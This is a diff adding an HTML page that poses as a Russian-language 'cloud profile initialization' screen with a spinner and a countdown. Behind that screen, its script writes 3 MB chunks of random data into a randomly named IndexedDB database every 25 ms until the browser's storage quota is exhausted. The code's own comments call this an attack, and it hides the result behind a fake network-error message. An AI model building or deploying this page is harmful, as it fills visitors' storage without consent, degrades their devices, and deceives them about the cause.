@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Инициализация облачного профиля...</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center; 
+            padding-top: 50px; 
+            background-color: #f4f4f9; 
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        #error { 
+            display:none; 
+            color: #d93025; 
+            font-weight: bold; 
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Инициализация облачного профиля</h1>
+        <p>Пожалуйста, подождите. Мы готовим ваше рабочее пространство.</p>
+        <div class="spinner"></div>
+        <p>Примерное время до завершения: <span id="timer">90</span> секунд.</p>
+        <p id="error">Не удалось подключиться к облаку. Проверьте соединение и <a href="javascript:location.reload();">повторите попытку</a>.</p>
+    </div>
+
+<script>
+    // --- НАСТРОЙКИ "ХАОТИЧНОГО АДА" ---
+    const DB_PREFIX = "UserProfileCache_"; // Префикс для имени БД
+    const STORE_NAME = "AssetData";
+    const CHUNK_SIZE_MB = 3; // Куски по 3 МБ
+    const WRITE_INTERVAL_MS = 25; // Чуть реже, чтобы не вешать UI намертво
+
+    // --- ЭЛЕМЕНТЫ ИНТЕРФЕЙСА ---
+    const timerElement = document.getElementById('timer');
+    const errorElement = document.getElementById('error');
+
+    // --- ГЕНЕРАЦИЯ ДАННЫХ ---
+    // Набор "тяжелых" и разнообразных символов
+    const charPool = '😀😃😄😁😆😅😂🤣😭😉😗😙😚😘🥰😍🤩🥳🤗🙃🙂😇😊☺️😌😏' +
+                     '🤔🤨😐😑😶🙄😬🤥🤫🤭🧐🤓🤯🤪' +
+                     '👍👎👊✊🤛🤜🤝🙏' +
+      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' +
+                     '데이터베이스系统資料庫데이터베이스'; // Корейский, китайский, японский
+
+    function generateRandomString(mb) {
+        const bytes = mb * 1024 * 1024;
+        let result = '';
+        // Примерная оценка, так как символы весят по-разному. Будем генерировать чуть больше.
+        const charCount = bytes / 2; 
+        for (let i = 0; i < charCount; i++) {
+            result += charPool.charAt(Math.floor(Math.random() * charPool.length));
+        }
+        // Обрезаем до нужного размера в байтах
+        return new TextEncoder().encode(result).slice(0, bytes);
+    }
+
+    // --- ОСНОВНАЯ ЛОГИКА ---
+    let db;
+    let writeIntervalId;
+    
+    // Генерируем рандомный ключ для имени БД
+    const randomKey = Math.random().toString(36).substring(2, 15);
+    const DB_NAME = DB_PREFIX + randomKey;
+    console.log(`Целевая база данных: ${DB_NAME}`);
+
+    const request = window.indexedDB.open(DB_NAME, 1);
+
+    request.onupgradeneeded = event => {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains(STORE_NAME)) {
+            db.createObjectStore(STORE_NAME, { autoIncrement: true });
+        }
+    };
+
+    request.onerror = event => {
+        console.error("Не удалось открыть IndexedDB:", event.target.error);
+        showError();
+    };
+
+    request.onsuccess = event => {
+        db = event.target.result;
+        console.log("База данных успешно открыта. Начинаем запись.");
+        writeIntervalId = setInterval(writeData, WRITE_INTERVAL_MS);
+    };
+
+    function writeData() {
+        if (!db) return;
+        
+        // Генерируем новый кусок данных для каждой записи
+        const randomDataChunk = generateRandomString(CHUNK_SIZE_MB);
+
+        try {
+            const transaction = db.transaction([STORE_NAME], 'readwrite');
+            const store = transaction.objectStore(STORE_NAME);
+            const addRequest = store.add(randomDataChunk);
+
+            addRequest.onsuccess = () => {
+                console.log(`Кусок размером ~${CHUNK_SIZE_MB}MB успешно записан в ${DB_NAME}.`);
+            };
+            addRequest.onerror = event => {
+                console.error("Ошибка записи (вероятно, хранилище переполнено):", event.target.error.name);
+                if (event.target.error.name === 'QuotaExceededError') {
+                    console.log("Квота исчерпана. Останавливаем атаку.");
+                    showError(); // Показываем ошибку пользователю, как будто это проблема сети
+                }
+            };
+        } catch (e) {
+            console.error("Критическая ошибка транзакции:", e);
+            showError();
+        }
+    }
+    
+    // --- ТАЙМЕР ДЛЯ ПОЛЬЗОВАТЕЛЯ ---
+    let timeLeft = 90;
+    const countdown = setInterval(() => {
+        timeLeft--;
+        timerElement.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            showError();
+        }
+    }, 1000);
+
+    function showError() {
+        clearInterval(countdown);
+        if (writeIntervalId) {
+            clearInterval(writeIntervalId);
+        }
+        document.querySelector('.spinner').style.display = 'none';
+        errorElement.style.display = 'block';
+    }
+
+</script>
+</body>
+</html>
